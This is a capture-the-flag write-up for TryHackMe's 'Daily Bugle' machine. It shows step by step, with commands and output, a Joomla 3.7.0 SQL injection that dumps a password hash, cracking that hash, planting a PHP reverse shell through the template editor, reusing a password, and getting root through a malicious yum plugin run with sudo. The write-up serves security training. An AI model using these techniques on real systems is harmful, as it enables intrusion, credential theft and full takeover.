# Daily Bugle

---

Platform: Tryhackme

Difficulty: Hard

Initial Access: SQLi in Joomla CMS

Privilege Escalation: Yum plugin abuse with sudo

---

Nmap scan results:

```bash
┌──(ghost㉿kali)-[~/tryhackme/daily-bugle]
└─$ sudo nmap -Pn -O -sC -A -p- --min-rate=2000 10.10.174.189 -oN nmap.full
[sudo] password for ghost: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 05:18 EDT
Warning: 10.10.174.189 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.174.189
Host is up (0.34s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-title: Home
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
```

- Port 22: Noting just open ssh , for later use only.
- Port 80: Interesting one, Maybe running on Joomla CMS
- Port 3306: mysql running on it, but we don’t have user pass to connect with it.

---

### Port 80:

![image.png](image.png)

Here, we got the answer for first question.

Let’s explore this website, there is nothing more of our interest in this index page. Maybe we can check /robots.txt 

![image.png](image%201.png)

As this website is running on Joomla CMS, we can enumerate it further via joomscan tool.

```bash
$ joomscan http://10.10.174.189/
```

![image.png](image%202.png)

As we can see what version of joomla is running on this webserver, we have our 2nd question answered.

---

### Exploiting Joomla via SQL Injection

Let’s see if there is any exploit we can find on exploit-db for this particular version of joomla.

```bash
┌──(ghost㉿kali)-[~/tryhackme/daily-bugle]
└─$ searchsploit joomla 3.7.0
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                           | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                        | php/webapps/43488.txt
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

There is a .txt file , maybe telling us how to perform exploit. Let’s check that.

![image.png](image%203.png)

As we thought, there are steps to perform this attack. We can use these steps if we want to exploit it with sqlmap otherwise these is a python script “joomblah.py”(Preferred method), which we can use to perform same attack. I am going with “joomblah.py” for this room.

[https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py](https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py)

First of all, download that python script from the link I provided above and copy it to the current working directory, then run that script with the following command:

```bash
┌──(ghost㉿kali)-[~/tryhackme/daily-bugle]
└─$ python2.7 joomblah.py http://10.10.174.189/ 
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

And we got the hash of jonah’s account: `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`

We can crack this hash via wheter john the ripper or hashcat. I am going with john the ripper.

```bash
┌──(ghost㉿kali)-[~/tryhackme/daily-bugle]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REDACTED     (?)     
1g 0:00:04:04 DONE (2025-07-15 05:59) 0.004097g/s 191.8p/s 191.8c/s 191.8C/s thelma1..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

---

### Gaining Reverse Shell

Now, as we cracked jonah’s hash and we have plain text password, we can now login to joomla CMS login page.

url = [`http://10.10.174.189/administrator`](http://10.10.174.189/administrator/index.php?option=com_templates&view=template&id=506&file=L2luZGV4LnBocA%3D%3D)

![image.png](image%204.png)

![image.png](image%205.png)

As we can see we are welcomed with CMS management sceen as we are admin now.

While looking around that management site, I see here we can edit php pages , so why not to upload php webshell and get the reverse shell back to us.

So, it in Extensions → Templates → Templates → Protostar template → index.php

![image.png](image%206.png)

![image.png](image%207.png)

![image.png](image%208.png)

Ok, here we can change index.php file and we will upload [php-reverse-shell(pentest-monkey)](https://github.com/pentestmonkey/php-reverse-shell).

![Add your kali machine’s tun0 IP here.](image%209.png)

Add your kali machine’s tun0 IP here.

Copy it all from here and paste that into index.php and click on save and close.

![image.png](image%2010.png)

Setup our netcat listner on listening mode on the port you specified on webshell.

And just trigger the index.php page of this website. url = [`http://10.10.160.163/](http://10.10.160.163/administrator/index.php?option=com_templates&view=template&id=506&file=L2luZGV4LnBocA%3D%3D)index.php`

And we should get the shell on our kali machine now.

```bash
┌──(ghost㉿kali)-[~/tryhackme/daily-bugle]
└─$ rlwrap -f . -r nc -nvlp 4445       
listening on [any] 4445 ...
connect to [10.17.87.131] from (UNKNOWN) [10.10.174.189] 57500
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 06:03:25 up 58 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

---

### Shell as JJameson

As we are sitting on an apache shell and we don’t have any access to jjameson’s directory. We can check `/var/www/html` .

And here we got a configuration file, which may be interesting for us.

```bash
sh-4.2$ cd /var/www/html
cd /var/www/html
sh-4.2$ ls -la
ls -la
total 64
drwxr-xr-x. 17 apache apache  4096 Dec 14  2019 .
drwxr-xr-x.  4 root   root      33 Dec 14  2019 ..
-rwxr-xr-x.  1 apache apache 18092 Apr 25  2017 LICENSE.txt
-rwxr-xr-x.  1 apache apache  4494 Apr 25  2017 README.txt
drwxr-xr-x. 11 apache apache   159 Apr 25  2017 administrator
drwxr-xr-x.  2 apache apache    44 Apr 25  2017 bin
drwxr-xr-x.  2 apache apache    24 Apr 25  2017 cache
drwxr-xr-x.  2 apache apache   119 Apr 25  2017 cli
drwxr-xr-x. 19 apache apache  4096 Apr 25  2017 components
-rw-r--r--   1 apache apache  1982 Dec 14  2019 configuration.php
-rwxr-xr-x.  1 apache apache  3005 Apr 25  2017 htaccess.txt
drwxr-xr-x.  5 apache apache   164 Dec 15  2019 images
drwxr-xr-x.  2 apache apache    64 Apr 25  2017 includes
-rwxr-xr-x.  1 apache apache  1420 Apr 25  2017 index.php
drwxr-xr-x.  4 apache apache    54 Apr 25  2017 language
drwxr-xr-x.  5 apache apache    70 Apr 25  2017 layouts
drwxr-xr-x. 11 apache apache   255 Apr 25  2017 libraries
drwxr-xr-x. 26 apache apache  4096 Apr 25  2017 media
drwxr-xr-x. 27 apache apache  4096 Apr 25  2017 modules
drwxr-xr-x. 16 apache apache   250 Apr 25  2017 plugins
-rwxr-xr-x.  1 apache apache   836 Apr 25  2017 robots.txt
drwxr-xr-x.  5 apache apache    68 Dec 15  2019 templates
drwxr-xr-x.  2 apache apache    24 Dec 15  2019 tmp
-rwxr-xr-x.  1 apache apache  1690 Apr 25  2017 web.config.txt
```

Let’s check it’s content:

![image.png](image%2011.png)

And we got a password, maybe we can use it for jjameson’ account.

```bash
┌──(ghost㉿kali)-[~/tryhackme/daily-bugle]
└─$ ssh jjameson@10.10.174.189                                           
The authenticity of host '10.10.174.189 (10.10.174.189)' can't be established.
ED25519 key fingerprint is SHA256:Gvd5jH4bP7HwPyB+lGcqZ+NhGxa7MKX4wXeWBvcBbBY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.174.189' (ED25519) to the list of known hosts.
jjameson@10.10.174.189's password: 
Last login: Mon Dec 16 05:14:55 2019 from netwars
[jjameson@dailybugle ~]$ ls -la
total 16
drwx------. 2 jjameson jjameson  99 Dec 15  2019 .
drwxr-xr-x. 3 root     root      22 Dec 14  2019 ..
lrwxrwxrwx  1 jjameson jjameson   9 Dec 14  2019 .bash_history -> /dev/null
-rw-r--r--. 1 jjameson jjameson  18 Aug  8  2019 .bash_logout
-rw-r--r--. 1 jjameson jjameson 193 Aug  8  2019 .bash_profile
-rw-r--r--. 1 jjameson jjameson 231 Aug  8  2019 .bashrc
-rw-rw-r--  1 jjameson jjameson  33 Dec 15  2019 user.txt
[jjameson@dailybugle ~]$ cat user.txt
27a260fe3.......REDACTED
```

---

### Shell as Root

While checking sudo privileges of user jjameson, we got to know that we can run yum as sudo.

We can check, how can we escalate our privileges via yum on gtfobins.

[yum
            
            |
            
            GTFOBins](https://gtfobins.github.io/gtfobins/yum/#sudo)

![image.png](image%2012.png)

Let’s just follow the steps:

1. Create a temporary directory
    
    ```bash
    [jjameson@dailybugle ~]$ TF=$(mktemp -d)
    ```
    
2. Create a `yum` configuration file pointing to your custom plugin directory
    
    ```bash
    [jjameson@dailybugle ~]$ cat >$TF/x<<EOF
    > [main]
    > plugins=1
    > pluginpath=$TF
    > pluginconfpath=$TF
    > EOF
    ```
    
3. Create a plugin config file named `y.conf`
    
    ```bash
    [jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
    > [main]
    > enabled=1
    > EOF
    ```
    
4. Create the malicious plugin itself
    
    ```bash
    [jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
    > import os
    > import yum
    > from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
    > requires_api_version='2.1'
    > def init_hook(conduit):
    >   os.execl('/bin/sh','/bin/sh')
    > EOF
    
    # This plugin runs during the init_hook stage.
    # It simply executes /bin/sh using os.execl.
    # If run with sudo, this spawns a root shell.
    ```
    
5. Run `yum` with custom config and plugin
    
    ```bash
    [jjameson@dailybugle ~]$ sudo /usr/bin/yum -c $TF/x --enableplugin=y
    Loaded plugins: y
    No plugin match for: y
    sh-4.2# id
    uid=0(root) gid=0(root) groups=0(root)
    sh-4.2# cd /root
    sh-4.2# ls -la
    total 28
    dr-xr-x---.  3 root root  163 Dec 15  2019 .
    dr-xr-xr-x. 17 root root  244 Dec 14  2019 ..
    -rw-------.  1 root root 1484 Dec 14  2019 anaconda-ks.cfg
    lrwxrwxrwx   1 root root    9 Dec 14  2019 .bash_history -> /dev/null
    -rw-r--r--.  1 root root   18 Dec 28  2013 .bash_logout
    -rw-r--r--.  1 root root  176 Dec 28  2013 .bash_profile
    -rw-r--r--.  1 root root  176 Dec 28  2013 .bashrc
    -rw-r--r--.  1 root root  100 Dec 28  2013 .cshrc
    drwxr-----.  3 root root   19 Dec 14  2019 .pki
    -rw-r--r--   1 root root   33 Dec 15  2019 root.txt
    -rw-r--r--.  1 root root  129 Dec 28  2013 .tcshrc
    sh-4.2# cat root.txt
    eec3d53292......REDACTED
    ```
    
    And we are root now!
    
    ---
    
    That’s it for this machine.✅